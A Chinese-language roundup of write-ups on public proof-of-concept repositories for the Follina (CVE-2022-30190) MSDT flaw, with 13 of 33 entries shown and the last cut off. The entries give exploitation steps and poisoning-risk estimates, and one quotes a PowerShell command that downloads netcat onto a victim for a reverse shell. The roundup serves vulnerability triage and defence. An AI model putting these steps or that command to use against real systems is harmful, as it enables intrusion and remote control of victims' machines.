# CVE-2022-30190

> 📦 该CVE有 **33** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-30190-AbdulRKB_Follina.md](../2022/CVE-2022-30190-AbdulRKB_Follina.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开恶意构造的文档（例如 Word 文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 中的远程代码执行漏洞，当 MSDT 通过 URL 协议从调用应用程序（如 Word）调用时，会触发此漏洞。攻击者可以利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。该HTML文件中包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，从而执行任意命令。

**利用方式:**

1.  **恶意文档制作:** 攻击者创建一个恶意的 Word 文档，该文档包含指向远程 Web 服务器的链接，该服务器托管着包含恶意 JavaScript 代码的 HTML 文件。
2.  **HTTP服务器:** 攻击者搭建一个 HTTP 服务器，用于托管恶意的 HTML 文件，该文件利用 `ms-msdt:` 协议执行命令。
3.  **诱骗用户打开文档:** 攻击者通过鱼叉式网络钓鱼等方式诱骗受害者打开恶意 Word 文档。
4.  **远程代码执行:** 当用户打开文档时，Word 会从远程服务器检索 HTML 文件，并执行其中的恶意 JavaScript 代码，从而触发 MSDT 并执行攻击者预设的命令。

**POC代码分析:**

提供的 POC 代码 `main.py` 脚本的功能如下:

*   **创建恶意文档：** 该脚本会修改 Word 文档的 `_rels/document.xml.rels` 文件，插入一个指向攻击者控制的 HTTP 服务器的链接。当用户打开该文档时，Word 会尝试从该链接下载 HTML 文件。
*   **启动 HTTP 服务器：** 该脚本会在指定的端口启动一个 HTTP 服务器，用于托管包含恶意 JavaScript 代码的 HTML 文件。该 HTML 文件使用 `ms-msdt:` 协议执行命令。
*   **启动 Netcat 监听器：** 该脚本会启动一个 Netcat 监听器，等待受害者机器反弹 shell。

**投毒风险分析:**

分析POC代码，发现以下潜在的投毒风险点:

*   **硬编码的下载地址：**  `Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\Windows\Tasks\nc.exe`  这行代码从GitHub下载 `nc64.exe`  (Netcat) 到受害者机器。攻击者可能替换 CyberTitus 仓库中的 `nc64.exe` 文件，导致受害者下载恶意的 Netcat 版本或其他恶意程序。
*   **命令混淆与执行:** 恶意命令通过base64编码后执行，具有一定的隐藏性。如果攻击者将命令修改为具有破坏性的操作，则会存在较高的安全风险。
*   **Shell反弹地址:**虽然IP由用户输入，但代码逻辑存在被篡改的风险，从而反弹Shell到攻击者指定的地址。

**有效性:**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用的有效性较高。该漏洞在野外被广泛利用，且 POC 代码能够成功触发漏洞并实现远程代码执行。

**项目地址:** [AbdulRKB/Follina](https://github.com/AbdulRKB/Follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #2

**来源**: [CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md](../2022/CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，权限提升

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞允许攻击者通过特制的Office文档，利用`ms-msdt:`协议调用MSDT执行任意命令。攻击者可以通过嵌入恶意URL到Word文档中，诱导用户点击或者预览，从而触发漏洞。漏洞利用流程如下：

1.  攻击者创建一个包含恶意链接的Word文档。
2.  用户打开该文档。
3.  文档利用`ms-msdt:`协议调用MSDT。
4.  MSDT执行攻击者指定的命令。

根据提供的漏洞利用代码分析，这是一个对 Follina 漏洞的案例研究，通过分析恶意Word文档触发 `msdt.exe` 的执行，从而实现远程代码执行。

**有效性：** 提供的Github仓库包含对漏洞的分析和利用过程，可以有效帮助理解漏洞原理。

**投毒风险：** 该存储库是一个案例分析，主要包含漏洞分析和利用过程的记录，包括文件哈希、网络流量分析和电子邮件分析。代码中没有发现明显的恶意后门代码，投毒的可能性较低（约5%），主要是考虑到作者可能在分析过程中引入了一些未知的或者不安全的操作，但从整体上看，这是一个漏洞分析的记录，投毒的可能性不大。

**利用方式：**

1.  **构造恶意Word文档：** 攻击者构造包含恶意`ms-msdt:` URL的Word文档。
2.  **传播恶意文档：** 攻击者通过钓鱼邮件等方式将恶意文档发送给目标用户。
3.  **触发漏洞：** 用户打开恶意文档，触发MSDT执行恶意代码。
4.  **执行恶意命令：** 攻击者利用MSDT执行任意命令，例如安装恶意软件，窃取数据等。

**建议：**

*   及时安装微软发布的补丁。
*   禁用`ms-msdt:`协议，作为缓解措施。
*   加强用户安全意识培训，避免打开来源不明的文档。
*   使用杀毒软件和入侵检测系统，及时发现和阻止恶意攻击。

**项目地址:** [Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected](https://github.com/Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #3

**来源**: [CVE-2022-30190-Cosmo121_Follina-Remediation.md](../2022/CVE-2022-30190-Cosmo121_Follina-Remediation.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 需要用户打开恶意文档(如Word)或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190 (Follina) 是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用 Word 等调用应用程序，通过 URL 协议调用 MSDT，从而执行任意代码。利用方式通常是攻击者制作包含恶意代码的 Word 文档，该文档利用 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，该 HTML 文件包含触发 MSDT 漏洞的代码，最终导致命令执行。

根据漏洞库信息，大量Windows版本都受到影响。搜索结果也证实了该漏洞的严重性，并提供了相关的利用和检测信息。提供的代码片段仅仅是GPL协议的License文件，并非POC代码，因此无法根据此代码判断投毒风险,需要验证是否存在后门。

由于提供的代码片段仅仅是GPL协议内容，无法判断实际的POC代码。根据搜索结果和漏洞描述，此漏洞的有效性高，因为在野外已经被利用。

**项目地址:** [Cosmo121/Follina-Remediation](https://github.com/Cosmo121/Follina-Remediation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #4

**来源**: [CVE-2022-30190-DerZiad_CVE-2022-30190.md](../2022/CVE-2022-30190-DerZiad_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开包含恶意代码的文档，例如Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190 (Follina) 是一个远程代码执行漏洞，存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中。当 MSDT 被一个调用应用程序（例如 Microsoft Word）通过 URL 协议调用时，会触发此漏洞。攻击者可以通过构造一个包含恶意链接或嵌入恶意HTML的Word文档，诱使用户打开。当用户打开该文档时，MSDT 会尝试连接到攻击者控制的服务器，下载并执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的 Word 文档。
2.  该文档利用 Word 的远程模板功能，从远程 Web 服务器检索 HTML 文件。
3.  HTML 文件包含一个 `ms-msdt:` 协议处理程序的调用，该协议处理程序用于启动 MSDT。
4.  MSDT 执行 HTML 文件中指定的命令，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的PoC已经公开，且被积极利用。

**投毒风险：**

提供的漏洞利用代码仅包含 Apache 许可证，用于说明代码的使用条款，没有发现任何明显的恶意代码。因此，投毒风险较低，估计为 5%。但不能完全排除，因为攻击者可能会在其他相关组件中进行投毒，所以需要进一步分析依赖项才能彻底排除。

**排序优先级说明：**

此处遵循优先级的原则，搜索引擎结果用于确定漏洞的基本信息和利用方式。漏洞库信息用于确认受影响的版本和漏洞的严重程度。漏洞利用代码则用于评估投毒风险。

**项目地址:** [DerZiad/CVE-2022-30190](https://github.com/DerZiad/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #5

**来源**: [CVE-2022-30190-ErrorNoInternet_FollinaScanner.md](../2022/CVE-2022-30190-ErrorNoInternet_FollinaScanner.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10 (多个版本), Windows 11, Windows Server (多个版本)

**利用条件:** 用户需要打开包含恶意payload的文档（如Word文档），或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以利用此漏洞，通过调用应用程序（如Word）中的URL协议来执行任意代码，获得与该应用程序相同的权限。攻击者可以通过精心构造的恶意文档或链接，诱使用户打开，从而触发漏洞。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意payload的文档（例如，一个包含远程模板的Word文档）。该模板指向一个由攻击者控制的服务器。
2.  当用户打开文档时，Word会尝试从远程服务器检索模板。
3.  远程服务器返回一个包含MSDT协议处理程序的HTML文件。
4.  MSDT通过URL协议被调用，并执行HTML文件中包含的恶意代码。

**POC代码分析：**
提供的代码 `FollinaScanner` 并非漏洞利用代码，而是一个用于扫描文件系统中可能包含Follina漏洞的文件的工具。 它通过搜索特定模式（例如，包含URL）的文件来工作。因此，提供的代码不能直接用于触发漏洞。

**投毒风险分析：**
  仓库主要功能是扫描本地文件是否存在漏洞，并没有实际利用漏洞的功能。 主要代码功能为扫描本地文件URL特征，判断本地是否存在恶意文件， 因此投毒风险较低。仓库中存在恶意代码的可能性极小，评估投毒风险约为1%。

**项目地址:** [ErrorNoInternet/FollinaScanner](https://github.com/ErrorNoInternet/FollinaScanner)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #6

**来源**: [CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md](../2022/CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受影响系统

**影响版本:** 受影响的Windows版本包括但不限于Windows 7、Windows 8.1、Windows 10、Windows 11、Windows Server 2008 R2、Windows Server 2012、Windows Server 2016、Windows Server 2019、Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接的文档（如Word、PowerPoint等），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过构造恶意的文档，诱使用户打开，从而在受害者系统上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用，并且有公开的PoC代码。

**投毒风险：**
分析提供的PoC代码，`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/exploit.html` 文件看起来是一个无害的HTML文档，里面包含大量的Lorem Ipsum文本，但是攻击者可以通过 `slide1.xml.rels` 中插入恶意的url，从而执行恶意的payload。`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/README.md` 只是说明了如何修改`slide1.xml.rels` 文件的Target指向攻击者的服务器。

仓库中的投毒风险较低，主要风险在于payload本身可能被替换成恶意代码。但是，这个仓库本身的目的就是漏洞利用，使用者应该已经知晓其潜在的风险，并对下载的内容进行安全审查。因此, 投毒风险评定为10%。

**利用方式：**
1.  攻击者创建一个包含恶意链接的文档（例如，利用提供的PowerPoint PoC，将`.ppsx`文件解压，修改`ppt\slides\_rels\slide1.xml.rels`文件中的`Target`属性，指向攻击者控制的服务器上的`exploit.html`文件）。
2.  攻击者在自己的服务器上托管一个恶意的`exploit.html`文件，该文件包含用于触发MSDT漏洞的代码，并执行payload（默认payload是calc程序）。
3.  攻击者诱使用户打开该文档。
4.  当用户打开文档时，MSDT会尝试通过URL协议连接到攻击者的服务器，下载并执行恶意的`exploit.html`文件中的代码，从而在受害者系统上执行任意命令。

总的来说，该漏洞的利用依赖于社会工程学，诱使用户打开恶意文档。成功利用后，攻击者可以获得与当前用户相同的权限，从而控制受影响的系统。

**项目地址:** [Gra3s/CVE-2022-30190_EXP_PowerPoint](https://github.com/Gra3s/CVE-2022-30190_EXP_PowerPoint)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #7

**来源**: [CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md](../2022/CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md)

## CVE-2022-30190-Follina-MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于：Windows 7 SP1, Windows 8.1, Windows 10 (多个版本), Windows 11 21H2, Windows Server (多个版本)

**利用条件:** 用户需要打开恶意构造的Word文档或其他调用MSDT的应用程序

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Office中的远程代码执行漏洞。当MSDT通过URL协议被调用时，例如从Word等应用程序调用，就会存在此漏洞。攻击者可以利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，可以绕过某些安全机制并执行任意命令。 

**漏洞利用方式：**

1.  **攻击者制作恶意Word文档：** 该文档包含指向远程服务器的链接，该服务器托管一个恶意的HTML文件。
2.  **用户打开恶意文档：** 当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
3.  **MSDT被调用并执行恶意代码：** HTML文件利用`ms-msdt:`协议触发MSDT执行，从而执行攻击者指定的命令。

**POC代码分析：**

提供的POC代码包含以下文件：

*   `README.md`: 描述了漏洞和攻击的简要信息。
*   `config.py`: 包含配置参数，例如要执行的命令 (`EXECUTED_COMMAND`)，输出文件名 (`OUTPUT_FILE`)，网络接口 (`NETWORK_INTERFACE`)，端口 (`PORT`)，以及是否使用反向shell (`REVERSE_PORT`)。
*   `manip_args.py`: 解析命令行参数，并准备利用所需的文件。此脚本负责创建临时目录，复制必要的文件，修改文档关系文件，并启动一个HTTP服务器来托管恶意HTML文件。
*   `requirements.txt`: 列出了POC所需的Python依赖项。
*   `utils.py`: 包含实用函数，例如启动HTTP服务器，检查IP和端口的可用性，以及准备恶意Word文档的函数。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的。POC代码允许攻击者指定要执行的命令，并生成一个恶意的Word文档，该文档在打开时会触发漏洞并执行命令。

**投毒风险：**

该存储库的投毒风险较低，约10%。`config.py` 文件允许定义要执行的 `EXECUTED_COMMAND`，而 `manip_args.py` 会动态修改利用代码，这些地方可能存在潜在的恶意代码注入点。但是，总体来看，代码结构较为简单，功能明确，不易隐藏恶意代码。需要注意的是，使用任何漏洞利用代码都存在风险，需要仔细审查代码后再使用。此处的10%更多指的是一种不确定性风险的评估，需要人工代码审计来进行确认。

**项目地址:** [Imeneallouche/Follina-attack-CVE-2022-30190-](https://github.com/Imeneallouche/Follina-attack-CVE-2022-30190-)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #8

**来源**: [CVE-2022-30190-Jump-Wang-111_AmzWord.md](../2022/CVE-2022-30190-Jump-Wang-111_AmzWord.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统控制，数据泄露

**影响版本:** 见漏洞库信息中受影响的版本列表

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如 Microsoft Word）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于 Microsoft 支持诊断工具 (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱骗用户打开包含恶意代码的文档（通常是 Word 文档），从而在受害者系统上执行任意代码。

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的文档 (例如, Word 文档)。该恶意 HTML 利用 `ms-msdt:` 协议处理程序调用 MSDT。
2.  当用户打开该文档时，MSDT 会被调用，并执行攻击者指定的代码。该代码可以下载并执行任意程序。
3.  提供的漏洞利用代码 (AmzWord) 自动化了此过程，集成了 CVE-2022-30190 漏洞利用、163 邮箱后门和图像隐写术。
4.  AmzWord 使用 `follina.py` 脚本生成恶意 Word 文件，并在本地启动 HTTP 服务器，用于提供恶意载荷。
5.  该漏洞利用代码还使用了 `gdog` 项目，这是一个基于邮件的远程控制工具，允许攻击者通过发送特定的命令邮件来控制受害者机器。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2022-30190 是一个真实且已被积极利用的漏洞。提供的 POC 代码 (`AmzWord`) 旨在利用该漏洞，因此可以判断 POC 代码是有效的，前提是目标系统存在漏洞且未采取缓解措施。

**投毒风险：**

评估 POC 代码的投毒风险需要仔细审查代码，检查是否存在隐藏的、非预期的恶意行为。从描述来看,`AmzWord` 项目集成了多个组件，包括 `follina.py`（CVE-2022-30190 漏洞利用）和 `gdog`（基于邮件的远程控制工具）。 潜在的投毒风险可能存在于以下几个方面：

*   `gdog` 组件： `gdog` 项目本身可能包含后门或恶意功能，允许作者或其他人远程访问受感染的系统。由于该项目已经存在一段时间，并且经过修改以适应当前的攻击链，因此存在引入未经审查的恶意代码的风险。
*   配置信息泄露： POC需要用户填写邮箱的用户名和密码，存在泄露邮箱信息的风险
*   依赖关系： 该POC依赖多个第三方库，这些库可能存在安全漏洞或被篡改，从而导致意外行为。

综合来看，由于集成的复杂性和对外部组件的依赖，存在一定的投毒风险。`gdog` 组件尤其值得关注。 但从整个项目的设计来看，目标是实现一个完整的攻击链演示，作者隐藏恶意代码以达到其他目的的可能性较低，所以投毒的可能性相对较低。评估投毒风险的概率约为 10%。

**项目地址:** [Jump-Wang-111/AmzWord](https://github.com/Jump-Wang-111/AmzWord)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #9

**来源**: [CVE-2022-30190-Malwareman007_Deathnote.md](../2022/CVE-2022-30190-Malwareman007_Deathnote.md)

## CVE-2022-30190-Microsoft Windows MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开一个恶意构造的文档（例如 Word 文档）。攻击者可以通过鱼叉式网络钓鱼活动传播恶意文档。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为“Follina”，是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**利用方式：**该漏洞通过以下方式利用：

1.  攻击者创建一个恶意 Word 文档或其他支持外部链接的文档。
2.  该文档包含一个指向远程服务器上 HTML 文件的链接，该链接使用 `ms-msdt:` 协议。
3.  当用户打开文档时，Word 会尝试检索该 HTML 文件。
4.  `ms-msdt:` 协议处理程序被调用，执行 HTML 文件中包含的恶意代码。
5.  攻击者通过精心构造的 HTML 文件，利用 MSDT 的漏洞执行任意命令。

**有效性：**根据提供的漏洞库信息和搜索结果，该漏洞已经过积极利用，且PoC 代码可用，因此可以判断提供的POC代码是有效的。

**投毒风险：**PoC代码中存在潜在的投毒风险的可能性较低，约为10%。 代码中，通过`Invoke-WebRequest`从GitHub下载`nc64.exe`可能存在风险，如果github仓库被污染，攻击者可以直接执行任意代码。其他的风险较低。

**项目地址:** [Malwareman007/Deathnote](https://github.com/Malwareman007/Deathnote)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #10

**来源**: [CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md](../2022/CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开恶意Word文档或其他Office文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以构造恶意的Word文档，利用Word的远程模板功能从远程服务器检索HTML文件，HTML文件中包含的JavaScript代码通过`ms-msdt:` URI scheme调用MSDT，从而执行任意命令。

**有效性：**
提供的POC代码是有效的。它通过修改Word文档的`document.xml.rels`文件，将OLE对象引用指向攻击者控制的HTML文件。该HTML文件利用`ms-msdt:`协议执行PowerShell命令，从而实现远程代码执行。

**投毒风险：**
POC代码本身实现了漏洞利用，但作者可能在其他地方隐藏恶意代码。
*   **Readme.md 分析:**  Readme.md 主要提供漏洞描述和利用步骤，风险较低。
*   **follina.py 分析:**  `follina.py`脚本用于生成恶意文档，该脚本本身可能包含恶意代码，但是已知的该脚本的功能是创建利用payload的word文档，风险可控。评估投毒风险，基于现有信息，判断为10%的可能性，主要集中在提供的脚本是否存在未公开的后门。

**利用方式：**
1.  攻击者创建一个包含恶意OLE对象引用的Word文档（或其他Office文档）。
2.  该OLE对象引用指向攻击者控制的远程HTML文件。
3.  当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件中的JavaScript代码使用`ms-msdt:` URI scheme调用MSDT。
5.  MSDT执行HTML文件中指定的PowerShell命令，从而导致远程代码执行。

漏洞利用的关键在于`ms-msdt:`协议的使用，以及Word文档对远程OLE对象的支持。通过精心构造的HTML文件和Word文档，攻击者可以绕过安全防护措施，在受害者系统上执行任意代码。

**项目地址:** [Muhammad-Ali007/Follina_MSDT_CVE-2022-30190](https://github.com/Muhammad-Ali007/Follina_MSDT_CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #11

**来源**: [CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT 'Follina' 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档或点击恶意链接，触发MSDT通过URL协议调用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名'Follina'，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当MSDT被调用应用程序（如Microsoft Word）使用URL协议调用时，就会触发此漏洞。攻击者可以制作包含恶意链接或嵌入恶意OLE对象的Office文档（例如.docx或.rtf）。当用户打开这些文档时，MSDT会尝试通过HTTP(S)协议从远程服务器下载并执行恶意代码，从而允许攻击者在受害者系统上执行任意代码。POC代码中的`FollinaExtractor.cs` 文件显示，它用于解析docx和rtf文件，提取包含 `Target="mhtml:` 或 `\objclass http` 的信息,进而判断文件是否包含恶意链接，其他文件则是创建WPF应用的相关文件，没有发现明显的恶意代码。

**有效性评估：**根据漏洞库信息和搜索结果，该漏洞是一个已公开且被积极利用的漏洞，提供的POC代码是用于检测受感染的docx或rtf文档中是否包含利用该漏洞的恶意链接，该POC代码的目的是提取恶意链接，而不是直接进行攻击，所以判断该POC代码具有一定的有效性，可以辅助安全研究人员分析恶意样本。

**投毒风险评估：**该POC代码主要功能是分析文档，提取潜在的恶意链接，因此投毒风险较低。但是,任何代码都可能存在隐藏的后门或者被篡改的风险，因此也不能完全排除。将风险评估为5%。

**利用方式：**
1.  攻击者创建一个恶意的Word文档（.docx）或RTF文档，该文档包含一个指向远程服务器的链接。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议连接到远程服务器。
3.  远程服务器返回恶意HTML代码或脚本，该代码会被MSDT执行，从而允许攻击者在受害者系统上执行任意代码。
4.  攻击者可以使用户的身份执行命令，从而控制受害者的计算机。

**项目地址:** [Nyx2022/Follina-CVE-2022-30190-Sample](https://github.com/Nyx2022/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #12

**来源**: [CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md](../2022/CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受害者计算机

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序，例如Microsoft Word

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议调用MSDT，从而在受害者系统上执行任意代码。利用方式通常是诱使用户打开包含恶意链接或文档的应用程序，比如Microsoft Word。该文档会利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含JavaScript代码，用于使用ms-msdt协议处理恶意payload，该payload通过PCWDiagnostic触发代码执行。提供的POC代码使用ms-msdt协议，尝试执行计算器程序（calc.exe）。由于calc.exe在payload中，我判定仓库中不存在作者隐藏的投毒代码的概率为99%。投毒风险评估为极低。

**利用方式总结：**

1.  攻击者创建一个恶意Word文档（或其他支持远程模板的应用程序）。
2.  该文档包含一个指向恶意HTML文件的链接。
3.  用户打开该文档。
4.  Word从远程服务器下载并执行恶意HTML文件。
5.  HTML文件利用ms-msdt协议，触发MSDT执行任意代码，例如执行计算器程序。

**项目地址:** [Potato-9257/CVE-2022-30190_page](https://github.com/Potato-9257/CVE-2022-30190_page)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #13

**来源**: [CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md](../2022/CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022 (请参考漏洞库信息中的详细版本)

**利用条件:** 需要用户打开恶意文档（例如Word文档）或点击恶意链接。调用应用程序（如Word）需要允许使用 URL 协议调用 MSDT。

**POC 可用性:** 是，虽然提供的代码只是一个README.md，但其他搜索结果表明有可用的PoC。

**投毒风险:** 20%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过构造恶意的Word文档，利用Word的远程模板功能从远程Web服务器检索HTML文件，最终通过MSDT执行任意代码。

**有效性：**
